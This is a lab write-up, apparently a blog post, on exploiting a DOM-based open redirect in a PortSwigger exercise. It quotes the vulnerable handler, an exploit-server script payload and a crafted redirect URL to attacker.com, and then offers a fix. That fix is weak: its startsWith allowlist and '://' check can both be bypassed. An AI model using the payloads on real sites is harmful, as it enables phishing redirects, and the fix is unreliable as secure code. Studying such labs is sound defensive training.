---
layout: post
title: "PortSwigger: DOM-Based Open Redirection"
date: 2027-07-29 09:00:00 -0500
categories: [PortSwigger, Open Redirect]
tags: [open-redirect, dom-based, CWE-601, location-href, query-param, url-redirect]
---

## Lab

**Topic:** DOM-based Open Redirection ([CWE-601](https://cwe.mitre.org/data/definitions/601.html))  
**Goal:** Exploit a client-side `location.href` sink that reads an unvalidated `url=` query parameter and redirect the victim to the exploit server.

---

## Overview

The blog post page contains a "Back to Blog" link with an onclick handler that reads the `url` query parameter via regex and assigns it to `location.href` with no origin or allowlist check. Crafting a URL like `/post?postId=1&url=https://attacker.com/` and delivering it to a victim causes their browser to redirect off-site when the handler fires.

---

## The Vulnerable Code

On the blog post page:

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location);
  location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

`window.location` coerces to the full URL string. The regex matches any `url=https://...` query parameter — no origin validation, no allowlist. Whatever HTTPS URL is in the parameter becomes the redirect destination.

---

## Exploitation

**Step 1 — Stage the payload on the exploit server:**

```
POST https://exploit-server/
responseFile=/exploit
responseBody=<script>location='https://TARGET/post?postId=1&url=https://exploit-server/'</script>
formAction=STORE
```

**Step 2 — Deliver to victim:**

```
GET https://exploit-server/deliver-to-victim
```

The victim bot visits the exploit server page → the JS sets `location` to the malicious blog URL → the onclick handler reads `url=https://exploit-server/` → `location.href` redirects the victim to the exploit server.

**Solved:** `is-solved` confirmed via the lab status widget.

---

## Why This Works

The vulnerability is entirely client-side — no HTTP 301/302 response from the server is involved. The regex `/url=(https?:\/\/.+)/` acts as the only "validation", but it only checks that the value starts with `http(s)://`. Any absolute URL passes.

DOM-based open redirects are distinct from server-side redirects because:
- The server never sees the redirect — it only sends the page with the vulnerable JS
- The source is `window.location` (the current URL), not a form POST or API response
- No Content Security Policy protects against it (CSP governs *script execution*, not *navigations*)

---

## The Fix

Replace the unvalidated redirect with an allowlist:

```javascript
const m = /url=(https?:\/\/.+)/.exec(location);
const ALLOWED = ['https://trusted.example.com'];
if (m && ALLOWED.some(a => m[1].startsWith(a))) {
  location.href = m[1];
} else {
  location.href = '/';
}
```

Or, simplest fix: only accept relative paths — reject any value containing `://`.

---

## References

- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [PortSwigger: DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- OWASP A01:2021 – Broken Access Control
